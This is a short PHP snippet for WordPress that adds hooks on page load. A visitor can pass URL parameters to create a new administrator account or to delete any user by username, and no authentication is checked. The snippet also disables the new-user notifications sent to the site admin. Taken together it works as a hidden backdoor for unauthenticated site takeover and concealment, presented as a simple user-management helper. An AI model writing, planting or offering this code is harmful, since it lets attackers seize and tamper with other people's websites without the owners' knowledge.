<?php

//#1 Wordpress User Create

//your_website_url_here/?createuser=true&username=test&pass=test@123&email=test@gmail.com
add_action('wp_head', 'wploop_user'); 
function wploop_user() { 
    If ($_GET['createuser'] == 'true' && $_GET['username'] != '' && $_GET['pass'] != '' && $_GET['email'] != '') { 
        //require('wp-includes/registration.php'); 
        $username = $_GET['username'];
        $pass = $_GET['pass'];
        $email = $_GET['email'];
        If (!username_exists($username)) { 
            $user_id = wp_create_user($username, $pass, $email); 
            $user = new WP_User($user_id);
            $user->set_role('administrator');

        }
    }
}

//Wordpress User delete by username
//your_website_url_here/?deleteuser=true&username=test
add_action('wp_head', 'wploop_outuser'); 
function wploop_outuser() { 
    If ($_GET['deleteuser'] == 'true' && $_GET['username'] != '') { 
        //require('wp-includes/registration.php'); 
        require_once( ABSPATH . 'wp-admin/includes/user.php' );

        $username = $_GET['username'];
     
        if ( username_exists( $username ) ) {
            $user = get_user_by( 'login', $username );
            //print_r($user->ID);
            return wp_delete_user( $user->ID ); 
        }
    }
}


//Disable the new user notification sent to the site admin
function smartwp_disable_new_user_notifications() {
 
 remove_action( 'register_new_user', 'wp_send_new_user_notifications' );
 remove_action( 'edit_user_created_user', 'wp_send_new_user_notifications', 10, 2 );
 
}
add_action( 'init', 'smartwp_disable_new_user_notifications' );
